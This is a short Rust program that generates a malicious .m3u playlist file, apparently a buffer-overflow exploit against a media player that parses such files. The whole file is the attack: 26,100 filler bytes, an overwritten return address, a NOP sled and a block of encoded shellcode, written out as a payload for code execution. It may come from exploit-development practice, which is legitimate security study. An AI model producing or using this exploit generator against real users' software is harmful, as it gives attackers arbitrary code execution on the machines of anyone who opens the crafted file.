use std::fs::File;
use std::io::prelude::*;

// const EIP: u32 = 0xdeadbeef; 

fn main() {
    let filename = "../payloads/test4.m3u";
    let mut f = File::create(&filename).unwrap();
    let junk = "A".repeat(26100);
    //let deadbeef = vec![0xef, 0xbe, 0xad, 0xde];
    // let deadbeef = b"\xef\xbe\xad\xde";
    let deadbeef = b"\xef\x31\x9d\x7c";
    let deadbeef = deadbeef.to_vec();

    let eip = unsafe {String::from_utf8_unchecked(deadbeef)};
    
    let nop_sled = b"\x90".repeat(4 * 100);
    let nop_sled = nop_sled.to_vec();
    let nop_sled = unsafe {String::from_utf8_unchecked(nop_sled)};

    let shellcode = b"\xda\xc7\xd9\x74\x24\xf4\x58\xbb\x4a\x81\x10\x05\x31\xc9\xb1\
    \x31\x83\xe8\xfc\x31\x58\x14\x03\x58\x5e\x63\xe5\xf9\xb6\xe1\
    \x06\x02\x46\x86\x8f\xe7\x77\x86\xf4\x6c\x27\x36\x7e\x20\xcb\
    \xbd\xd2\xd1\x58\xb3\xfa\xd6\xe9\x7e\xdd\xd9\xea\xd3\x1d\x7b\
    \x68\x2e\x72\x5b\x51\xe1\x87\x9a\x96\x1c\x65\xce\x4f\x6a\xd8\
    \xff\xe4\x26\xe1\x74\xb6\xa7\x61\x68\x0e\xc9\x40\x3f\x05\x90\
    \x42\xc1\xca\xa8\xca\xd9\x0f\x94\x85\x52\xfb\x62\x14\xb3\x32\
    \x8a\xbb\xfa\xfb\x79\xc5\x3b\x3b\x62\xb0\x35\x38\x1f\xc3\x81\
    \x43\xfb\x46\x12\xe3\x88\xf1\xfe\x12\x5c\x67\x74\x18\x29\xe3\
    \xd2\x3c\xac\x20\x69\x38\x25\xc7\xbe\xc9\x7d\xec\x1a\x92\x26\
    \x8d\x3b\x7e\x88\xb2\x5c\x21\x75\x17\x16\xcf\x62\x2a\x75\x85\
    \x75\xb8\x03\xeb\x76\xc2\x0b\x5b\x1f\xf3\x80\x34\x58\x0c\x43\
    \x71\x96\x46\xce\xd3\x3f\x0f\x9a\x66\x22\xb0\x70\xa4\x5b\x33\
    \x71\x54\x98\x2b\xf0\x51\xe4\xeb\xe8\x2b\x75\x9e\x0e\x98\x76\
    \x8b\x6c\x7f\xe5\x57\x5d\x1a\x8d\xf2\xa1";
    let shellcode = shellcode.to_vec();
    let shellcode = unsafe {String::from_utf8_unchecked(shellcode)};

    let payload = junk + &eip + &nop_sled + &shellcode;
    let payload = payload.as_bytes();
    f.write(&payload).unwrap();
}
